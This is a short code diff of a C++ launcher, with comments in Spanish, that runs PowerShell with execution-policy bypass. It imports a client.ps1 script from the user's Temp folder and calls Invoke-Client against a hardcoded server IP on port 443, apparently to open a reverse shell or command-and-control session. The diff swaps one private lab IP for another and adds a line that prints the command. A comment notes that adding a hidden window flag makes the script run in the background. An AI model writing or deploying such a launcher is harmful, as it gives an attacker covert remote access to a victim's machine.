@@ -7,7 +7,7 @@
 		#include <lmcons.h>
 		#include <cstring>
 		#define PSSCRIPT "client.ps1"
-		#define IPADDR "192.168.114.129"
+		#define IPADDR "10.10.1.13"
 		using namespace std;
 
 		int main(void){
@@ -19,6 +19,7 @@
 		       string user(username);      
 		       string ruta_script = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + nombre_script;
 		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\"";
+		       printf("%s\n",strCMD.c_str());
 		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
 
 		}
